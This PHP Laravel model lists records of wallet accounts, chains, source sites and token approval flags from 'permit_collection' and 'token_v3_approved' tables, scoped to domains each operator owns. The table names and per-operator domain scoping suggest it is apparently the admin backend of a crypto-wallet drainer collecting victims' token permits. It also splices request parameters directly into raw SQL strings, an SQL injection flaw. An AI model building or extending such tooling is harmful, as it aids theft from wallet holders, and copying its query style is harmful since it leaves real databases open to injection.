<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Pagination\LengthAwarePaginator;
use OpenAdmin\Admin\Admin;
use \App\Models\PacketSiteCollection;

use function PHPUnit\Framework\isEmpty;

class PermitCollection extends Model
{
    use HasFactory;
    protected $table = 'permit_collection';

public function paginate()
{
    $perPage = Request::get('per_page', 20);

    $page = Request::get('page',1);
    $chain =Request::get('chain');
    $source =Request::get('source');
    $isV3approved = Request::get('isV3approved');
    $start = ($page-1)*$perPage;
   
 //根剧账号角色显示行内容
    if(Admin::user()->isRole('administrator')){

        $chain_condition = empty($chain) ? 1  : "pc.`chain`=$chain";
        $source_condition = empty($source) ? "" : "and pc.`source`='$source'";
       
        if($isV3approved){
           $sql ="SELECT pc.`id`,pc.`chain`,pc.`account`,pc.`source`,tva.`token_address`,tva.`is_v3_approved` 
           FROM 
            `permit_collection` pc
            LEFT JOIN 
            `token_v3_approved` tva 
            ON
            pc.`id` = tva.`permit_collection_id`
            WHERE  $chain_condition $source_condition and tva.`is_v3_approved` limit $perPage offset $start" ;

            $sql2 = "SELECT pc.`id`,pc.`chain`,pc.`account`,pc.`source`,tva.`token_address`,tva.`is_v3_approved` 
           FROM 
            `permit_collection` pc
            LEFT JOIN 
            `token_v3_approved` tva 
            ON
            pc.`id` = tva.`permit_collection_id`
            WHERE $chain_condition $source_condition and tva.`is_v3_approved`";
        }else{
            $sql = "SELECT * FROM `permit_collection` pc WHERE $chain_condition $source_condition limit $perPage offset $start";    
            $sql2 = "SELECT * FROM `permit_collection` pc WHERE $chain_condition $source_condition";
        }



    }else{
        $PacketSiteCollection = new PacketSiteCollection();
        $websiteObj = $PacketSiteCollection->where('owner', Admin::user()->username);

        $websites = [];
        foreach($websiteObj->get('new_domain') as $website){
            $websites[] = $website['new_domain'];
        }
        $chain_condition = empty($chain) ? 1  : "pc.`chain`=$chain";
        $source_condition = empty($source) ? "" : "and pc.`source`='$source'";

        if($isV3approved){
           $sql ="SELECT pc.`id`,pc.`chain`,pc.`account`,pc.`source`,tva.`token_address`,tva.`is_v3_approved` 
           FROM 
            `permit_collection` pc
            LEFT JOIN 
            `token_v3_approved` tva 
            ON
            pc.`id` = tva.`permit_collection_id`
            WHERE  $chain_condition $source_condition and tva.`is_v3_approved`  and `source` in ('$websites[0]') limit $perPage offset $start" ;

            $sql2 = "SELECT pc.`id`,pc.`chain`,pc.`account`,pc.`source`,tva.`token_address`,tva.`is_v3_approved` 
           FROM 
            `permit_collection` pc
            LEFT JOIN 
            `token_v3_approved` tva 
            ON
            pc.`id` = tva.`permit_collection_id`
            WHERE $chain_condition $source_condition and tva.`is_v3_approved`  and `source` in ('$websites[0]')";
        }else{
            $sql = "SELECT * FROM `permit_collection` pc WHERE  $chain_condition $source_condition and pc.`source` in ('$websites[0]') limit $perPage offset $start";
            $sql2 = "SELECT * FROM `permit_collection` pc WHERE $chain_condition $source_condition and pc.`source` in ('$websites[0]')";
        }

    }


    $result = DB::select($sql);
    $result2 = DB::select($sql2);
 
    $rs = ['rs'=>$result];
    extract($rs);
    $total = sizeof($result2);
    $data = static::hydrate($rs);

    $paginator = new LengthAwarePaginator($data, $total, $perPage);

    $paginator->setPath(url()->current());

    return $paginator;
}

public static function with($relations)
{
    return new static;
}


    
}
